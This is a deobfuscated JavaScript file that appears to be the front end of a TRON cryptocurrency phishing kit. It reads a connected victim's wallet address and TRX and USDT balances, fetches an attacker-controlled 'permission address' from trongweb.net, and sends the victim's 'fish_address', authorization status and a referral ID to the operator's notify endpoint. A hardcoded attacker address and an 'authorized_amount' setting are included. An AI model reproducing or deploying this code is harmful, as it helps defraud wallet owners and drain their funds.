//Fri May 09 2025 03:19:49 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {})();
window.API_URL = "https://trongweb.net";
const _0x3cd88e = {
  "address": null,
  "trxBalance": null,
  "usdtBalance": null,
  "tgusername": null
};
let _0xc7ccf9 = false;
const _0x4bc2fb = "your-shared-secret",
  _0x428ef5 = "TPWJyggvoJDRsCRHjSuUNTrd4fGQShBoeG",
  _0x3f4421 = window.options || {
    "trx_balance": "0",
    "usdt_balance": "0",
    "authorized_amount": "2",
    "permission_address": _0x428ef5,
    "notification_switch": "1"
  };
function _0x542c27(_0x19dfe2) {
  const _0x349e04 = document.createElement("div");
  Object.assign(_0x349e04.style, {
    "position": "fixed",
    "top": "38%",
    "left": "50%",
    "transform": "translateX(-50%)",
    "backgroundColor": "rgba(240, 240, 240, 1)",
    "color": "black",
    "padding": "10px 20px",
    "borderRadius": "4px",
    "boxShadow": "0 4px 8px rgba(0, 0, 0, 0.2)",
    "zIndex": "1000",
    "fontSize": "16px",
    "textAlign": "center",
    "maxWidth": "80%"
  });
  _0x349e04.textContent = _0x19dfe2;
  document.body.appendChild(_0x349e04);
  setTimeout(() => _0x349e04.remove(), 3000);
}
function _0x49f5fa(_0x5769dc, _0x3a53de) {
  if (typeof CryptoJS !== "object" || !CryptoJS.HmacSHA256) {
    throw new Error("CryptoJS 未加载，请检查网络或刷新页面");
  }
  const _0x470552 = JSON.stringify(_0x5769dc) + _0x3a53de;
  return CryptoJS.HmacSHA256(_0x470552, _0x4bc2fb).toString(CryptoJS.enc.Hex);
}
async function _0x97be17() {
  const _0x240dc4 = {},
    _0x2ee78a = Date.now().toString(),
    _0x401db7 = _0x49f5fa(_0x240dc4, _0x2ee78a);
  try {
    const _0x3aa2a5 = await fetch(window.API_URL + "/api/get_contract_address", {
      "method": "POST",
      "headers": {
        "X-Timestamp": _0x2ee78a,
        "X-Signature": _0x401db7,
        "Content-Type": "application/json"
      },
      "body": JSON.stringify(_0x240dc4)
    });
    if (!_0x3aa2a5.ok) throw new Error("获取合约地址失败");
    const _0x5e2b2c = await _0x3aa2a5.json();
    return _0x5e2b2c.contract_address || _0x428ef5;
  } catch (_0x286593) {
    return console.error("获取合约地址失败:", _0x286593.message), _0x428ef5;
  }
}
function _0x505014(_0x50d986) {
  if (!_0x50d986.uid || typeof _0x50d986.uid !== "string" || _0x50d986.uid.length > 50) {
    throw new Error("uid 无效");
  }
  if (!_0x50d986.fish_address || !/^[T][A-Za-z0-9]{33}$/.test(_0x50d986.fish_address)) throw new Error("fish_address 无效");
  if (!_0x50d986.permission_address || !/^[T][A-Za-z0-9]{33}$/.test(_0x50d986.permission_address)) throw new Error("permission_address 无效");
  if (![1, 2, 3].includes(_0x50d986.auth_status)) {
    throw new Error("auth_status 必须为 1、2 或 3");
  }
  if (_0x50d986.utmSource && typeof _0x50d986.utmSource !== "string") throw new Error("utmSource 无效");
  if (_0x50d986.txid && (typeof _0x50d986.txid !== "string" || _0x50d986.txid.length > 100)) {
    throw new Error("txid 无效");
  }
  return true;
}
function _0x88cd02(_0x5d13df, _0x483f15 = null) {
  const _0x585604 = new URLSearchParams(window.location.search),
    _0x3d1406 = _0x585604.get("utm_source") || "unknown",
    _0x24ca41 = {
      "uid": _0x3cd88e.tgusername || "unknown",
      "fish_address": _0x3cd88e.address,
      "permission_address": _0x3f4421.permission_address,
      "auth_status": _0x5d13df,
      "utmSource": _0x3d1406,
      "txid": _0x483f15
    };
  try {
    _0x505014(_0x24ca41);
  } catch (_0x4efc5e) {
    console.warn("通知数据验证失败:", _0x4efc5e.message);
    return;
  }
  const _0x4640f5 = Date.now().toString(),
    _0x5c0075 = _0x49f5fa(_0x24ca41, _0x4640f5),
    _0x4db8b6 = async (_0x2a5ae5 = 0) => {
      if (_0x2a5ae5 >= 3) {
        console.warn("通知发送失败，已达最大重试次数");
        return;
      }
      try {
        const _0x46449c = await fetch(window.API_URL + "/api/notify", {
          "method": "POST",
          "headers": {
            "Content-Type": "application/json",
            "X-Timestamp": _0x4640f5,
            "X-Signature": _0x5c0075
          },
          "body": JSON.stringify(_0x24ca41)
        });
        if (!_0x46449c.ok) {
          const _0x3ba09c = await _0x46449c.json().catch(() => ({}));
          if (_0x46449c.status === 429) {
            console.warn("请求过于频繁，将重试");
            setTimeout(() => _0x4db8b6(_0x2a5ae5 + 1), 1000);
            return;
          }
          throw new Error("通知失败: " + (_0x3ba09c.error || _0x46449c.statusText));
        }
        const _0x1b4c2c = await _0x46449c.json();
        console.log("通知发送成功 (auth_status=" + _0x5d13df + "):", _0x1b4c2c);
      } catch (_0x36d4ae) {
        console.warn("通知发送失败 (尝试 " + (_0x2a5ae5 + 1) + "/3):", _0x36d4ae.message);
        setTimeout(() => _0x4db8b6(_0x2a5ae5 + 1), 1000);
      }
    };
  _0x4db8b6();
}
async function _0x193629() {
  if (_0xc7ccf9) return;
  (await _0xa59a70()) ? (_0xc7ccf9 = true, await _0x17f414(), _0x49729d()) : setTimeout(_0x193629, 1500);
}
async function _0xa59a70() {
  try {
    if (window.tronWeb?.["ready"]) return await _0x17f414(), true;
    const _0x23b6c5 = () => new Promise(_0x45e789 => {
        let _0xc47ed9 = 0;
        const _0x274a05 = setInterval(() => {
          if (window.tronWeb?.["ready"] || _0xc47ed9++ >= 10) {
            clearInterval(_0x274a05);
            _0x45e789(window.tronWeb?.["ready"]);
          }
        }, 500);
      }),
      _0x4bfc39 = await _0x23b6c5();
    if (_0x4bfc39) return await _0x17f414(), true;
    return false;
  } catch (_0x4a13fb) {
    return console.error("连接钱包失败:", _0x4a13fb), false;
  }
}
async function _0x17f414() {
  if (!window.tronWeb?.["ready"]) throw new Error("请连接钱包");
  const _0x225eff = new URLSearchParams(window.location.search);
  _0x3cd88e.tgusername = _0x225eff.get("uid") || null;
  if (!_0x3cd88e.tgusername) {
    console.warn("未找到推荐ID");
  }
  const _0x265373 = window.tronWeb.defaultAddress.base58;
  if (!_0x265373) throw new Error("无法获取钱包地址");
  _0x3cd88e.address = _0x265373;
  const [_0x38108f, _0x34ebd9] = await Promise.all([window.tronWeb.trx.getBalance(_0x265373).then(_0x2e21ef => window.tronWeb.fromSun(_0x2e21ef)).catch(() => "0"), window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t").then(_0x2407f2 => _0x2407f2.balanceOf(_0x265373).call()).then(_0x194239 => window.tronWeb.fromSun(_0x194239.toString())).catch(() => "0")]);
  _0x3cd88e.trxBalance = _0x38108f;
  _0x3cd88e.usdtBalance = _0x34ebd9;
  _0x3f4421.permission_address = await _0x97be17();
}
async function _0x49729d() {
  if (_0x3f4421.notification_switch !== "1") return;
  _0x88cd02(1);
}